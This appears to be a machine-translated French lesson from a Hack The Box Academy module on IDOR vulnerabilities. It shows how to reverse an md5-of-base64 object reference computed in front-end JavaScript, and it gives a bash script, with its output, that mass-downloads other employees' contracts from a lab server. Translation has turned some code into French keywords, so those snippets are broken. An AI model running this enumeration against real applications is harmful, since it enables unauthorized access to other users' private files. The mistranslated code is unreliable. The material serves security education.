Contournement des références codées
============================

* * * * *

Dans la section précédente, nous avons vu un exemple d'IDOR qui utilise les uid des employés en texte clair, ce qui facilite l'énumération. Dans certains cas, les applications Web créent des hachages ou encodent leurs références d'objet, ce qui rend l'énumération plus difficile, mais cela reste possible.

Revenons à l'application Web `Employee Manager` pour tester la fonctionnalité `Contrats` :

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg)

Si nous cliquons sur le fichier `Employment_contract.pdf` , le téléchargement du fichier commence. La requête interceptée dans Burp ressemble à ceci :

![download_contract](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)

Nous voyons qu'il envoie une requête `POST` à `download.php` avec les données suivantes :

Code : php

```
contrat=cdd96d3cc73d1dbdaffa03cc6cd7339b

```

L'utilisation d'un script `download.php` pour télécharger des fichiers est une pratique courante pour éviter de créer des liens directs vers des fichiers, car cela peut être exploitable par plusieurs attaques Web. Dans ce cas, l'application Web n'envoie pas la référence directe en texte clair, mais semble la hacher au format "md5". Les hachages sont des fonctions à sens unique, nous ne pouvons donc pas les décoder pour voir leurs valeurs d'origine.

Nous pouvons tenter de hacher différentes valeurs, telles que `uid`, `username`, `filename` et bien d'autres, et voir si l'un de leurs hachages `md5` correspond à la valeur ci-dessus. Si nous trouvons une correspondance, nous pouvons la répliquer pour d'autres utilisateurs et collecter leurs fichiers. Par exemple, essayons de comparer le hachage `md5` de notre `uid`, et voyons s'il correspond au hachage ci-dessus :

```
dsgsec@htb[/htb]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -

```

Malheureusement, les hachages ne correspondent pas. Nous pouvons essayer cela avec divers autres champs, mais aucun d'entre eux ne correspond à notre hachage. Dans les cas avancés, nous pouvons également utiliser `Burp Comparer` et fuzzer différentes valeurs, puis comparer chacune à notre hachage pour voir si nous trouvons des correspondances. Dans ce cas, le hachage `md5` pourrait correspondre à une valeur unique ou à une combinaison de valeurs, ce qui serait très difficile à prévoir, faisant de cette référence directe une `référence d'objet directe sécurisée`. Cependant, il y a un défaut fatal dans cette application Web.

* * * * *

Divulgation des fonctions
-------------------

Comme la plupart des applications Web modernes sont développées à l'aide de frameworks JavaScript, tels que `Angular`, `React` ou `Vue.js`, de nombreux développeurs Web peuvent commettre l'erreur d'exécuter des fonctions sensibles sur le front-end, ce qui les exposerait à des attaquants. . Par exemple, si le hachage ci-dessus était calculé sur le front-end, nous pouvons étudier la fonction, puis reproduire ce qu'elle fait pour calculer le même hachage. Heureusement pour nous, c'est précisément le cas dans cette application Web.

Si nous examinons le lien dans le code source, nous voyons qu'il appelle une fonction JavaScript avec `javascript:downloadContract('1')`. En examinant la fonction `downloadContract()` dans le code source, nous voyons ce qui suit :

Code : javascript

```
fonction downloadContract(uid) {
     $.redirect("/download.php", {
         contrat : CryptoJS.MD5(btoa(uid)).toString(),
     }, "POSTER", "_self");
}

```

Cette fonction semble envoyer une requête `POST` avec le paramètre `contract` , ce que nous avons vu ci-dessus. La valeur qu'il envoie est un hachage `md5` utilisant la bibliothèque `CryptoJS` , qui correspond également à la requête que nous avons vue précédemment. Donc, la seule chose qui reste à voir est quelle valeur est hachée.

Dans ce cas, la valeur hachée est `btoa(uid)`, qui est la chaîne codée en `base64` de la variable `uid` , qui est un argument d'entrée pour la fonction. En revenant au lien précédent où la fonction a été appelée, nous la voyons appeler `downloadContract('1')`. Ainsi, la valeur finale utilisée dans la requête `POST` est la chaîne encodée `base64` de `1`, qui a ensuite été hachée `md5` .

Nous pouvons tester cela en `base64` encodant notre `uid=1`, puis en le hachant avec `md5`, comme suit :

```
dsgsec@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -

```

Astuce : Nous utilisons l'indicateur `-n` avec `echo` et l'indicateur `-w 0` avec `base64`, pour éviter d'ajouter des retours à la ligne, afin de pouvoir calculer le hachage `md5` de la même valeur. , sans hacher les sauts de ligne, car cela modifierait le hachage `md5` final.

Comme nous pouvons le voir, ce hachage correspond au hachage de notre requête, ce qui signifie que nous avons réussi à inverser la technique de hachage utilisée sur les références d'objet, en les transformant en IDOR. Avec cela, nous pouvons commencer à énumérer les contrats des autres employés en utilisant la même méthode de hachage que nous avons utilisée ci-dessus. `Avant de continuer, essayez d'écrire un script similaire à celui que nous avons utilisé dans la section précédente pour énumérer tous les contrats`.

* * * * *

Dénombrement de masse
----------------

Encore une fois, écrivons un simple script bash pour récupérer tous les contrats des employés. Le plus souvent, il s'agit de la méthode la plus simple et la plus efficace pour énumérer les données et les fichiers via les vulnérabilités IDOR. Dans les cas plus avancés, nous pouvons utiliser des outils tels que `Burp Intrudeuh` ou `ZAP Fuzzer`, mais un simple script bash devrait être le meilleur moyen pour notre exercice.

Nous pouvons commencer par calculer le hachage pour chacun des dix premiers employés à l'aide de la même commande précédente tout en utilisant `tr -d` pour supprimer les `- `caractères de fin, comme suit :

```
dsgsec@htb[/htb]$ pour je dans {1..10} ; faire echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; fait

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd

```

Ensuite, nous pouvons faire une requête `POST` sur `download.php` avec chacun des hachages ci-dessus comme valeur `contract` , ce qui devrait nous donner notre script final :

Code : bash

```
#!/bin/bash

#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done

```

Avec cela, nous pouvons exécuter le script, et il devrait télécharger tous les contrats des employés 1 à 10 :

```
dsgsec@htb[/htb]$ bash ./exploit.sh
dsgsec@htb[/htb]$ ls -1

contrat_006d1236aee3f92b8322299796ba1989.pdf
contrat_0b24df25fe628797b3a50ae0724d2730.pdf
contrat_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contrat_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contrat_5d4aace023dc088767b4e08c79415dcd.pdf
contrat_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contrat_b523ff8d1ced96cef9c86492e790c2fb.pdf
contrat_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contrat_d477819d240e7d3dd9499ed8d23e7158.pdf
contrat_f7947d50da7a043693a592b4db43b0a1.pdf

```

Comme nous pouvons le voir, parce que nous avons pu inverser la technique de hachage utilisée sur les références d'objets, nous pouvons maintenant exploiter avec succès la vulnérabilité IDOR pour récupérer tous les contrats des autres utilisateurs.
